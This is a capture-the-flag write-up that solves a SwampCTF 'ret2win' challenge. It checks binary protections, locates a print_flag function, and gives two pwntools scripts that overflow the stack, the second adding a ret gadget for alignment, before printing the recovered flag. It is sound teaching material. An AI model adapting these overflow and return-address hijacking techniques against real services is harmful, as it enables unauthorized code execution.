First things first, lets check file protections

```shell
checksec --file hello
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

No protections, sweet
Lets look at the functions in gdb

```shell
0x0000000000401216  main
0x00000000004012a3  print_flag
```

Looking at disassembly of print_flag functions, it reads from a file named flag.txt and prints it, to run the exploit locally, create a flag.txt file on local system

This is a basic return to win challenge

The explot is

```python
#!/usr/bin/env python3

from pwn import *

exe = './hello'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

host,port = 'chals.swampctf.com',61231

#p = process(exe)
p = remote(host,port)

padding = 40

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    elf.symbols['print_flag']
)

p.sendlineafter(b'?',payload)
p.interactive()
```

You will notice this exploit works locally but not on remote server, this is because of stack alignment. You can read more about it here [Stack Alignment](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment)

To solve this issue, just add a single ret gadget before calling the function

```python
#!/usr/bin/env python3

from pwn import *

exe = './hello'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

host,port = 'chals.swampctf.com',61231

#p = process(exe)
p = remote(host,port)

padding = 40
ret = 0x000000000040101a # ropper --file hello --search "ret"

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    ret,
    elf.symbols['print_flag']
)

p.sendlineafter(b'?',payload)
p.interactive()
```

Run this and we get the flag

**_flag : swampCTF{allways_3nabl3_pi3}_**
